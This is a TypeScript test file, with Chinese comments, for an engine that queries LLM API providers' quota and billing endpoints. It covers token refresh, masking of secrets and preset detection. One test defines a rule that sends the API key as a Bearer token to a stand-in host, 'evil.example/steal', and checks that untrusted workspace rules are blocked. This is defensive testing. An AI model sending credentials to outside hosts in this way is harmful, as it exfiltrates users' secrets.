import { describe, expect, it } from "vitest";
import { runQuotaRule, validateQuotaRule } from "./engine.js";
import { detectQuota } from "./detect.js";
import { QUOTA_PRESETS, presetsForBaseUrl } from "./presets.js";
import type { QuotaSecrets } from "./types.js";

type Call = { url: string; method: string; headers: Record<string, string>; body?: string };

/** 按 URL 路径返回预设响应的 fetch 替身，并记录每次请求 */
function fakeFetch(routes: Record<string, unknown | ((call: Call) => { status: number; body: unknown })>) {
  const calls: Call[] = [];
  const fn = async (url: string, init: { method: string; headers: Record<string, string>; body?: string }) => {
    const call = { url, method: init.method, headers: init.headers, body: init.body };
    calls.push(call);
    const u = new URL(url);
    const route = routes[`${u.host}${u.pathname}`] ?? routes[u.pathname];
    if (route === undefined) return { ok: false, status: 404, text: async () => "not found" };
    const out = typeof route === "function" ? (route as (c: Call) => { status: number; body: unknown })(call) : { status: 200, body: route };
    return { ok: out.status < 400, status: out.status, text: async () => (typeof out.body === "string" ? out.body : JSON.stringify(out.body)) };
  };
  return { fn, calls };
}

function memorySecrets(init: { accessToken?: string; refreshToken?: string; cookie?: string } = {}): QuotaSecrets & { state: typeof init } {
  const state = { ...init };
  return {
    state,
    getAccessToken: async () => (state.accessToken ? { value: state.accessToken } : undefined),
    setAccessToken: async (v) => { state.accessToken = v; },
    getRefreshToken: async () => state.refreshToken,
    setRefreshToken: async (v) => { state.refreshToken = v; },
    getCookie: async () => state.cookie,
    setCookie: async (v) => { state.cookie = v; },
  };
}

const provider = { name: "relay", baseUrl: "https://relay.example/v1", apiKey: "sk-secret-123" };

describe("用量查询引擎", () => {
  it("旧版单请求规则照常可用：fields + scale + unit", async () => {
    const { fn, calls } = fakeFetch({ "/api/subscription": { data: { used: 1_000_000, total: 5_000_000, reset: 1_900_000_000 } } });
    const result = await runQuotaRule(provider, {
      url: "{{origin}}/api/subscription",
      headers: { authorization: "Bearer {{apiKey}}" },
      fields: { used: "$.data.used", total: "$.data.total", resetAt: "$.data.reset" },
      scale: 500000,
      unit: "$",
    }, { fetch: fn });
    expect(calls[0].url).toBe("https://relay.example/api/subscription");
    expect(calls[0].headers.authorization).toBe("Bearer sk-secret-123");
    expect(result.metrics[0]).toMatchObject({ used: 2, total: 10, remaining: 8, percent: 20, unit: "$", resetAt: 1_900_000_000_000 });
    expect(result.total).toBe(10);
  });

  it("多步请求 + 字段级换算：OpenAI 兼容账单接口（已用以美分计）", async () => {
    const { fn, calls } = fakeFetch({
      "/v1/dashboard/billing/subscription": { hard_limit_usd: 50 },
      "/v1/dashboard/billing/usage": { total_usage: 1250 },
    });
    const preset = QUOTA_PRESETS.find((p) => p.id === "new-api-key")!;
    const result = await runQuotaRule(provider, preset.rule, { fetch: fn, now: () => new Date(2026, 9, 28).getTime() });
    expect(calls[1].url).toContain("end_date=2026-10-28");
    expect(result.metrics[0]).toMatchObject({ label: "令牌额度", total: 50, used: 12.5, remaining: 37.5, percent: 25 });
  });

  it("each 展开数组 + labelMap：一组时间窗口限额", async () => {
    const { fn } = fakeFetch({
      "/api/monitor/usage/quota/limit": { data: { limits: [
        { type: "TOKENS_LIMIT", percentage: 42, nextResetTime: 1_900_000_000_000 },
        { type: "TIME_LIMIT", usage: 1000, currentValue: 120, remaining: 880 },
      ] } },
    });
    const preset = QUOTA_PRESETS.find((p) => p.id === "zhipu-coding")!;
    const result = await runQuotaRule({ ...provider, baseUrl: "https://open.bigmodel.cn/api/coding/paas/v4" }, preset.rule, { fetch: fn });
    expect(result.metrics.map((m) => m.label)).toEqual(["5 小时 Token 额度", "MCP 调用次数"]);
    expect(result.metrics[0]).toMatchObject({ kind: "window", percent: 42, resetAt: 1_900_000_000_000 });
    expect(result.metrics[1]).toMatchObject({ used: 120, total: 1000, remaining: 880, percent: 12 });
  });

  it("可选步骤失败时跳过，引用它的指标被省略", async () => {
    const { fn } = fakeFetch({ "openrouter.ai/api/v1/key": { data: { usage: 3.5, limit: null, limit_remaining: null } } });
    const preset = QUOTA_PRESETS.find((p) => p.id === "openrouter")!;
    const result = await runQuotaRule({ ...provider, baseUrl: "https://openrouter.ai/api/v1" }, preset.rule, { fetch: fn });
    expect(result.metrics).toHaveLength(1);
    expect(result.metrics[0]).toMatchObject({ label: "此 Key 限额", used: 3.5 });
  });

  it("后一步可以引用前一步的结果", async () => {
    const { fn, calls } = fakeFetch({ "/api/self": { data: { id: 42 } }, "/api/users/42/quota": { left: 7 } });
    const result = await runQuotaRule(provider, {
      steps: [{ id: "self", url: "{{origin}}/api/self" }, { id: "q", url: "{{origin}}/api/users/{{steps.self.data.id}}/quota" }],
      metrics: [{ label: "剩余", remaining: "q:$.left" }],
    }, { fetch: fn });
    expect(calls[1].url).toBe("https://relay.example/api/users/42/quota");
    expect(result.metrics[0].remaining).toBe(7);
  });

  it("访问令牌失效（401）时用 refresh token 换新令牌并重试一次", async () => {
    let issued = "";
    const { fn } = fakeFetch({
      "/api/usage": (call: Call) => call.headers.authorization === `Bearer ${issued}` && issued ? { status: 200, body: { balance: 9 } } : { status: 401, body: "expired" },
      "/auth/refresh": () => { issued = "fresh-token"; return { status: 200, body: { access_token: "fresh-token", refresh_token: "rotated" } }; },
    });
    const secrets = memorySecrets({ accessToken: "old-token", refreshToken: "rt" });
    const result = await runQuotaRule(provider, {
      auth: { header: "authorization", prefix: "Bearer ", refresh: { url: "{{origin}}/auth/refresh", body: { refresh_token: "{{refreshToken}}" }, accessTokenPath: "$.access_token", refreshTokenPath: "$.refresh_token" } },
      steps: [{ id: "main", url: "{{origin}}/api/usage" }],
      metrics: [{ label: "余额", remaining: "$.balance" }],
    }, { fetch: fn, secrets });
    expect(result.metrics[0].remaining).toBe(9);
    expect(secrets.state).toMatchObject({ accessToken: "fresh-token", refreshToken: "rotated" });
  });

  it("响应预览里的密钥被打码，错误信息也一样", async () => {
    const { fn } = fakeFetch({ "/q": { echo: "sk-secret-123", n: 1 } });
    const result = await runQuotaRule(provider, { url: "{{origin}}/q", fields: { balance: "$.n" } }, { fetch: fn });
    expect(result.responsePreview).not.toContain("sk-secret-123");
    const failing = fakeFetch({ "/q": () => ({ status: 500, body: "bad key sk-secret-123" }) });
    await expect(runQuotaRule(provider, { url: "{{origin}}/q", fields: { balance: "$.n" } }, { fetch: failing.fn })).rejects.toThrow(/\*\*\*/);
  });

  it("工作区来的规则不能把请求发到 provider 以外的主机", async () => {
    const { fn, calls } = fakeFetch({ "evil.example/steal": { n: 1 } });
    const rule = { url: "https://evil.example/steal", headers: { authorization: "Bearer {{apiKey}}" }, fields: { balance: "$.n" } };
    await expect(runQuotaRule({ ...provider, quotaTrusted: false }, rule, { fetch: fn })).rejects.toThrow(/工作区配置/);
    expect(calls).toHaveLength(0);
    // 用户自己的规则不受限
    await expect(runQuotaRule({ ...provider, quotaTrusted: true }, rule, { fetch: fn })).resolves.toBeTruthy();
  });

  it("没有取到任何数值时报错并带响应预览，而不是返回空结果", async () => {
    const { fn } = fakeFetch({ "/q": { other: 1 } });
    await expect(runQuotaRule(provider, { url: "{{origin}}/q", fields: { balance: "$.missing" } }, { fetch: fn })).rejects.toThrow(/没有从响应里取到任何数值/);
  });

  it("校验：非法路径、重复步骤名、缺少指标", () => {
    expect(() => validateQuotaRule({ url: "https://x/q", fields: { balance: "data.balance" } })).toThrow(/路径不合法/);
    expect(() => validateQuotaRule({ steps: [{ id: "a", url: "https://x" }, { id: "a", url: "https://y" }], metrics: [{ remaining: "$.n" }] })).toThrow(/重复/);
    expect(() => validateQuotaRule({ steps: [{ id: "a", url: "https://x" }] })).toThrow(/至少需要一条指标/);
  });

  it("所有内置模板都能通过校验", () => {
    for (const preset of QUOTA_PRESETS) expect(() => validateQuotaRule(preset.rule), preset.id).not.toThrow();
  });
});

describe("自动识别", () => {
  it("按 baseUrl 主机匹配专用模板，排在通用模板前面", () => {
    const ids = presetsForBaseUrl("https://api.deepseek.com/v1").map((p) => p.id);
    expect(ids[0]).toBe("deepseek");
    expect(ids).not.toContain("moonshot-cn");
  });

  it("逐个尝试凭证齐全的模板，返回第一个取到数值的", async () => {
    const { fn, calls } = fakeFetch({
      "/v1/dashboard/billing/subscription": () => ({ status: 404, body: "no" }),
      "/user/api/usage": { totalCredits: 30, creditLimit: 100 },
    });
    const detected = await detectQuota(provider, { fetch: fn, secrets: memorySecrets() });
    expect(detected.preset?.id).toBe("credits-usage");
    expect(detected.rule).toMatchObject({ enabled: true, preset: "credits-usage" });
    expect(detected.result?.metrics[0]).toMatchObject({ used: 30, total: 100 });
    expect(detected.attempts.map((a) => a.preset)).toContain("new-api-key");
    // 需要面板令牌 / 用户 ID 的模板在凭证不齐时不尝试
    expect(calls.some((c) => c.url.includes("/api/user/self"))).toBe(false);
  });
});

describe("规则校验", () => {
  it("引用不存在的步骤名在校验时就报错", () => {
    expect(() => validateQuotaRule({ steps: [{ id: "a", url: "https://x" }], metrics: [{ remaining: "b:$.n" }] })).toThrow(/不存在的步骤「b」/);
  });
});
